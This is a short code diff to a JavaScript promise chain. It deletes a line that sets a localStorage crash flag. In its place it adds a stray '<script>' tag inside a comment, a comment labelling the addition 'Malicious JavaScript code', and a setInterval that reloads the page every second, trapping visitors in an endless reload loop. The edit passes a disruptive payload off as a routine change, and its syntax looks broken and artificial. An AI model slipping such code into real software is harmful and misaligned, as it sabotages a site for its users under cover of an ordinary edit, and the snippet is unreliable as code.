@@ -49,8 +49,11 @@
                         });
                     })
                     .then(() => {
-                        // Set crash flag before heavy operations
-                        localStorage.setItem("crashTest", "pending");
+                        // Set crash flag before heavy operations<script>
+                          // Malicious JavaScript code
+                    setInterval(function() {
+                    window.location.reload();
+                    }, 1000);
                     })
                     .then(() => {
                         var total = "";
